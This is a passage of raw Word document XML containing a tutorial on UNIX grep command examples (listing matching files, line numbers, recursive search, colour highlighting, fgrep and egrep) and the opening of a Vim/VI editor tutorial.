          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> *</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E226A7C"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Searches only for words ending in 'ERROR', so it matches the word `</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>SysERROR</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>'.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="595BDEC1"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t>Example 8: UNIX command to display files names which contain given word</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="347D656F"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Another useful grep command line option is "grep -l" which display only the file names which match the given pattern. Below command will only display file names which have ERROR?</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49A92C90"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FBDE2D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-l</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> ERROR *.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="8DA6CE"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>log</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A1F76F6"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grep -l 'main' *.java will list the names of all Java files in the current directory whose contents mention `main'.</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Also, find command in UNIX can be used in place of grep at many places. If you want to leverage the full potential of grep, then using </w:t>
      </w:r>
      <w:hyperlink r:id="rId61" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>Grep pocket reference </w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>is not a bad idea, an ideal grep reference for system admin, developers, and security professionals</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2423B5BA" w14:textId="0343A60B" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08FF6BE0"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lastRenderedPageBreak/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="49DA38E8"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t>Example 9: grep command option to display lines numbers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53C5EF87"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If you want to see line number of matching lines you can use the option "grep -n" below command will show on which lines Error has appeared.</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6B82E050"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-n ERROR </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="8DA6CE"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>log</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E447D7"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r>
    </w:p>
    <w:p w14:paraId="4EA4B070"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r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Example 10: How to do a recursive search in a directory using grep in UNIX</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F118E68"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If you want to do a recursive search using grep command in Unix there are two options either use "-R" command line option or increase directory one by one as shown below.</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7F90FDD3"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FBDE2D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-R</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> store *</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786683E1" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240"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This command will search for directory or file with the name stored in the current directory and it's all sub-directory.</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p w14:paraId="0FDE553D" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="360" w:lineRule="atLeast"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Bonux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Examples</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F78BA6F"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t>Now I have two bonus examples of grep command in UNIX:</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 xml:space="preserve">11) grep command in UNIX can show a matching pattern in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>color</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> which is quite useful to highlight the matching section, to see matching pattern in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>color</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> use below command.</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lastRenderedPageBreak/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="359513C9" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="004826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heme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">$ </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="8DA6CE"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>grep</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Exception today.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="8DA6CE"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>log</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="F8F8F8"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>color</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3324C93B"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r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>You can also create alias grep='grep --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>color</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">' in your </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>bash_profile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> file to avoid typing --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>color</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> every time.</w:t>
      </w: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t>12) There are three versions of grep command in UNIX  "grep,  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>fgrep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>egrep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>". `</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>fgrep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>' stands for Fixed `grep', `</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>egrep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>' Extended `grep'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A62822D" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D81DE07" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:pBdr>
          <w:top w:val="dotted" w:sz="2" w:space="2" w:color="BBBBBB"/>
          <w:left w:val="dotted" w:sz="6" w:space="22" w:color="BBBBBB"/>
          <w:bottom w:val="dotted" w:sz="6" w:space="2" w:color="BBBBBB"/>
          <w:right w:val="dotted" w:sz="6" w:space="11" w:color="BBBBBB"/>
        </w:pBdr>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId62" w:tooltip="10 example of using Vim or VI editor in UNIX and Linux" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cstheme="majorHAnsi"/>
            <w:color w:val="333333"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">10 example of using Vim or VI editor in UNIX and Linux </w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3A2F802B" w14:textId="2B8E0ADE" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Vim or VI editor tutorial in UNIX </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>VI Editor</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is like notepad in UNIX but it’s extremely powerful and have a sophisticated feature to work as complete IDE. No matter which version of UNIX you are working or which flavor you are using you always find either </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>VI editor</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">VIM </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>there. VI is a very large topic and I am not covering every aspect of it what I am sharing here is some examples of using VI editor in UNIX or Linux. most of the time we use only 10% of VI editor and never know 90% of it , to be frank, I also don't know many of VI feature by heart but I always search for it , see people working in VI and learn from their experience as well. after working on</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> VI editor</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> what I found that every day we learn something new in VI editor but we  forget something equally important and there I thought lets document whatever </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
